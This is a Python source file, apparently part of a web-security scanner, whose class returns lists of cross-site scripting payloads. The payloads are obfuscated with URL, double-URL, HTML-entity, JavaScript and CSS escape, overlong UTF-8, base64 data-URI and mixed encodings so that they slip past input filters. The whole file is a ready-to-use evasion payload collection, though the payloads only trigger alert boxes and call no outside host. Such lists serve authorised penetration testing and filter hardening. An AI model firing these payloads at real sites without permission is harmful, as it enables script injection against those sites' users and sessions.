#!/usr/bin/env python3

"""
Encoding-based XSS Payloads

Various encoding techniques for XSS payload obfuscation.

Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Created: Вс 10 авг 2025 19:35:00 MSK
Telegram: https://t.me/EasyProTech
"""

from typing import List, Optional
import base64
import urllib.parse
import html


class EncodingPayloads:
    """Encoding-based XSS payload collection"""
    
    @staticmethod
    def get_url_encoded_payloads() -> List[str]:
        """URL encoded XSS payloads"""
        return [
            # Basic URL encoding
            '%3Cscript%3Ealert(1)%3C/script%3E',
            '%3Cimg%20src=x%20onerror=alert(1)%3E',
            '%3Csvg%20onload=alert(1)%3E',
            '%3Ciframe%20src=javascript:alert(1)%3E',
            '%3Cbody%20onload=alert(1)%3E',
            
            # Double URL encoding
            '%253Cscript%253Ealert(1)%253C/script%253E',
            '%253Cimg%2520src=x%2520onerror=alert(1)%253E',
            '%253Csvg%2520onload=alert(1)%253E',
            
            # Mixed case URL encoding
            '%3cscript%3ealert(1)%3c/script%3e',
            '%3CSCRIPT%3EALERT(1)%3C/SCRIPT%3E',
            '%3CScript%3EAlert(1)%3C/Script%3E',
            
            # Partial URL encoding
            '%3Cscript>alert(1)</script%3E',
            '<script%3Ealert(1)%3C/script>',
            '<script>alert%281%29</script>',
            
            # Unicode URL encoding
            '%u003Cscript%u003Ealert(1)%u003C/script%u003E',
            '%u003Cimg%u0020src=x%u0020onerror=alert(1)%u003E',
        ]
    
    @staticmethod
    def get_html_entity_payloads() -> List[str]:
        """HTML entity encoded XSS payloads"""
        return [
            # Named entities
            '&lt;script&gt;alert(1)&lt;/script&gt;',
            '&lt;img src=x onerror=alert(1)&gt;',
            '&lt;svg onload=alert(1)&gt;',
            '&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;',
            '&apos;&gt;&lt;script&gt;alert(1)&lt;/script&gt;',
            
            # Decimal entities
            '&#60;script&#62;alert(1)&#60;/script&#62;',
            '&#60;img src=x onerror=alert(1)&#62;',
            '&#60;svg onload=alert(1)&#62;',
            '&#34;&#62;&#60;script&#62;alert(1)&#60;/script&#62;',
            '&#39;&#62;&#60;script&#62;alert(1)&#60;/script&#62;',
            
            # Hexadecimal entities
            '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
            '&#x3C;img src=x onerror=alert(1)&#x3E;',
            '&#x3C;svg onload=alert(1)&#x3E;',
            '&#x22;&#x3E;&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
            '&#x27;&#x3E;&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
            
            # Mixed entities
            '&lt;scr&#105;pt&gt;alert(1)&lt;/scr&#105;pt&gt;',
            '&#60;scr&#x69;pt&#62;alert(1)&#60;/scr&#x69;pt&#62;',
            '&lt;&#x69;mg src=x onerror=alert(1)&gt;',
            
            # Uppercase entities
            '&LT;SCRIPT&GT;ALERT(1)&LT;/SCRIPT&GT;',
            '&LT;IMG SRC=X ONERROR=ALERT(1)&GT;',
            '&LT;SVG ONLOAD=ALERT(1)&GT;',
        ]
    
    @staticmethod
    def get_javascript_encoding_payloads() -> List[str]:
        """JavaScript encoding techniques"""
        return [
            # Unicode escape sequences
            '<script>\\u0061\\u006C\\u0065\\u0072\\u0074(1)</script>',
            '<script>eval("\\u0061\\u006C\\u0065\\u0072\\u0074(1)")</script>',
            '<script>\\u0061\\u006C\\u0065\\u0072\\u0074(\\u0031)</script>',
            
            # Hex escape sequences
            '<script>\\x61\\x6C\\x65\\x72\\x74(1)</script>',
            '<script>eval("\\x61\\x6C\\x65\\x72\\x74(1)")</script>',
            '<script>\\x61\\x6C\\x65\\x72\\x74(\\x31)</script>',
            
            # Octal escape sequences
            '<script>\\141\\154\\145\\162\\164(1)</script>',
            '<script>eval("\\141\\154\\145\\162\\164(1)")</script>',
            '<script>\\141\\154\\145\\162\\164(\\61)</script>',
            
            # String.fromCharCode
            '<script>alert(String.fromCharCode(88,83,83))</script>',
            '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
            '<script>String.fromCharCode(97,108,101,114,116,40,49,41)</script>',
            
            # Base64 with atob
            '<script>eval(atob("YWxlcnQoMSk="))</script>',
            '<script>eval(atob("YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="))</script>',
            '<script>Function(atob("YWxlcnQoMSk="))()</script>',
            
            # URI decoding
            '<script>eval(unescape("%61%6C%65%72%74%28%31%29"))</script>',
            '<script>eval(decodeURI("%61%6C%65%72%74%28%31%29"))</script>',
            '<script>eval(decodeURIComponent("%61%6C%65%72%74%28%31%29"))</script>',
        ]
    
    @staticmethod
    def get_css_encoding_payloads() -> List[str]:
        """CSS encoding techniques"""
        return [
            # CSS unicode escapes
            '<style>\\61 \\6C \\65 \\72 \\74 {color:red}</style>',
            '<style>@import"\\6A \\61 \\76 \\61 \\73 \\63 \\72 \\69 \\70 \\74 \\3A alert(1)"</style>',
            '<style>body{background:\\75 \\72 \\6C (javascript:alert(1))}</style>',
            
            # CSS hex escapes
            '<style>\\41 lert{color:red}</style>',
            '<style>\\53 cript{color:red}</style>',
            '<style>\\4F nload{color:red}</style>',
            
            # CSS comments
            '<style>/**/a/**/l/**/e/**/r/**/t/**/{color:red}</style>',
            '<style>al/**/ert{color:red}</style>',
            '<style>@import/**/"javascript:alert(1)"</style>',
            
            # CSS string escapes
            '<style>@import "\\6A \\61 \\76 \\61 \\73 \\63 \\72 \\69 \\70 \\74 \\3A \\61 \\6C \\65 \\72 \\74 \\28 \\31 \\29"</style>',
            '<style>body{background:url("\\6A \\61 \\76 \\61 \\73 \\63 \\72 \\69 \\70 \\74 \\3A \\61 \\6C \\65 \\72 \\74 \\28 \\31 \\29")}</style>',
        ]
    
    @staticmethod
    def get_utf8_encoding_payloads() -> List[str]:
        """UTF-8 encoding variations"""
        return [
            # UTF-8 overlong encoding
            '%C0%BCscript%C0%BEalert(1)%C0%BC/script%C0%BE',
            '%E0%80%BCscript%E0%80%BEalert(1)%E0%80%BC/script%E0%80%BE',
            '%F0%80%80%BCscript%F0%80%80%BEalert(1)%F0%80%80%BC/script%F0%80%80%BE',
            
            # UTF-16 encoding
            '%FF%FE%3C%00s%00c%00r%00i%00p%00t%00%3E%00a%00l%00e%00r%00t%00(%001%00)%00%3C%00/%00s%00c%00r%00i%00p%00t%00%3E%00',
            '%FE%FF%00%3C%00s%00c%00r%00i%00p%00t%00%3E%00a%00l%00e%00r%00t%00(%001%00)%00%3C%00/%00s%00c%00r%00i%00p%00t%00%3E',
            
            # UTF-32 encoding
            '%FF%FE%00%00%3C%00%00%00s%00%00%00c%00%00%00r%00%00%00i%00%00%00p%00%00%00t%00%00%00%3E%00%00%00',
            
            # Mixed UTF-8
            '%C0%BCimg src=x onerror=alert(1)%C0%BE',
            '%E0%80%BCsvg onload=alert(1)%E0%80%BE',
            
            # BOM variations
            '%EF%BB%BF<script>alert(1)</script>',
            '%FF%FE<script>alert(1)</script>',
            '%FE%FF<script>alert(1)</script>',
        ]
    
    @staticmethod
    def get_base64_data_uri_payloads() -> List[str]:
        """Base64 encoded data URI payloads"""
        return [
            # Basic data URIs
            'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
            'data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==',
            'data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+',
            'data:text/html;base64,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==',
            
            # JavaScript data URIs
            'data:application/javascript;base64,YWxlcnQoMSk=',
            'data:text/javascript;base64,YWxlcnQoMSk=',
            'data:application/x-javascript;base64,YWxlcnQoMSk=',
            
            # SVG data URIs
            'data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+',
            'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIG9ubG9hZD0iYWxlcnQoMSkiPg==',
            
            # Complex HTML in base64
            'data:text/html;base64,PCFET0NUWVBFIGh0bWw+PGh0bWw+PGhlYWQ+PC9oZWFkPjxib2R5PjxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD48L2JvZHk+PC9odG1sPg==',
            
            # With charset
            'data:text/html;charset=utf-8;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
            'data:text/html;charset=utf-16;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
            
            # Mixed content types
            'data:text/plain;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
            'data:application/octet-stream;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        ]
    
    @staticmethod
    def get_mixed_encoding_payloads() -> List[str]:
        """Mixed encoding technique payloads"""
        return [
            # URL + HTML entities
            '%3Cscr&#105;pt%3Ealert(1)%3C/scr&#105;pt%3E',
            '%3C&#x69;mg src=x onerror=alert(1)%3E',
            '&#60;scr%69pt&#62;alert(1)&#60;/scr%69pt&#62;',
            
            # Unicode + URL encoding
            '\\u003Cscript\\u003E%61%6C%65%72%74(1)\\u003C/script\\u003E',
            '%3Cscript%3E\\u0061\\u006C\\u0065\\u0072\\u0074(1)%3C/script%3E',
            
            # HTML entities + Unicode
            '&#60;script&#62;\\u0061\\u006C\\u0065\\u0072\\u0074(1)&#60;/script&#62;',
            '&lt;script&gt;\\x61\\x6C\\x65\\x72\\x74(1)&lt;/script&gt;',
            
            # Base64 + URL encoding
            '%64%61%74%61%3A%74%65%78%74%2F%68%74%6D%6C%3B%62%61%73%65%36%34%2C%50%48%4E%6A%63%6D%6C%77%64%44%35%68%62%47%56%79%64%43%67%78%4B%54%77%76%63%32%4E%79%61%58%42%30%50%67%3D%3D',
            
            # CSS + JavaScript encoding
            '<style>\\61 \\6C \\65 \\72 \\74 \\28 \\31 \\29</style><script>\\u0061\\u006C\\u0065\\u0072\\u0074(1)</script>',
            
            # Multiple layers
            '%25%33%43%73%63%72%69%70%74%25%33%45%61%6C%65%72%74%28%31%29%25%33%43%2F%73%63%72%69%70%74%25%33%45',  # Triple URL encoded
        ]
    
    @staticmethod
    def encode_payload(payload: str, encoding_type: str) -> str:
        """Encode a payload with specified encoding type"""
        if encoding_type == "url":
            return urllib.parse.quote(payload, safe='')
        elif encoding_type == "html":
            return html.escape(payload)
        elif encoding_type == "base64":
            return base64.b64encode(payload.encode()).decode()
        elif encoding_type == "double_url":
            return urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe='')
        return payload
    
    @staticmethod
    def get_all() -> List[str]:
        """Get all encoding-based XSS payloads"""
        payloads = []
        payloads.extend(EncodingPayloads.get_url_encoded_payloads())
        payloads.extend(EncodingPayloads.get_html_entity_payloads())
        payloads.extend(EncodingPayloads.get_javascript_encoding_payloads())
        payloads.extend(EncodingPayloads.get_css_encoding_payloads())
        payloads.extend(EncodingPayloads.get_utf8_encoding_payloads())
        payloads.extend(EncodingPayloads.get_base64_data_uri_payloads())
        payloads.extend(EncodingPayloads.get_mixed_encoding_payloads())
        return payloads